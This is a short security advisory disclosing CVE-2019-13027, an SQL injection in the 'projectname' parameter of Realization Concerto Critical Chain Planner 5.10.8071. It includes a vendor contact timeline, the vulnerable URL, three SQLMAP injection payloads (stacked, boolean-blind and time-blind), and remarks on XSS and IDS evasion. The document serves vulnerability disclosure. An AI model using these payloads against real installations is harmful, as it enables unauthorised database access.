# CVE-2019-13027
Details for disclosing CVE-2019-13027

Vendor contact timeline:
1st July 2019 -> No response, no email back.

4th July 2019 -> No response, no email back.

8th July 2019 -> Email sent, Github created.

11 July 2019 -> No Vendor response. Vuln disclosed.


> [Vulnerability Type]
> SQL Injection
> [Affected Product Code Base]
> CONCERTO CRITICAL CHAIN PLANNER (CCPM) - Version: 5.10.8071 (Other versions on 5.x branch are probably affected. Cannot test with >other branchs)
> ------------------------------------------
> 
> [Affected Component]
> Realization Concerto Critical Chain Planner (aka CCPM) 5.10.8071 has some critical security Issues, being
> SQL Injection in at least in  taskupdt/taskdetails.aspx webpage via the "projectname" parameter
> 
> ------------------------------------------
> 
> [Attack Type]
> Remote
> 
> 
> [Attack Vectors]
> Application has a lot of reflected XSS/CSRF (for example, in checklist/checklist) , but the tricky part is the SQL Injections. Some tampering is needed depending on SQL Server versión and/or IDS/IPS. 
>
> 
>URL:
> https:/concertoURL/taskupdt/taskdetails.aspx?projectname=foo&taskID=1&uniqueTaskID=2&taskuniqueid=2&reportname=&securitycode=undefined&bIsSubTask=undefined
> 
> ProjectName (foo) must exist and be valid. Fuzz the rest of parameters (or use a real request).
>foo has also an XSS 
>
>Detected SQL (payloads From SQLMAP)
> Parameter: projectname (GET)
>   
> 
>     Type: stacked queries
>     Title: Microsoft SQL Server/Sybase stacked queries (comment)
>     Payload: projectname=foo';WAITFOR DELAY '0:0:5'--
> 
>     Type: boolean-based blind
>     Title: AND boolean-based blind - WHERE or HAVING clause
>     Payload: projectname=foo' AND 3676=3676-- 
>
>     Type: time-based blind
>     Title: Microsoft SQL Server/Sybase time-based blind (IF)
>     Payload: projectname=foo' WAITFOR DELAY '0:0:5'-- 
> 
>
> 
> 
> [Vendor of Product]
> REALIZATION - https://www.realization.com/
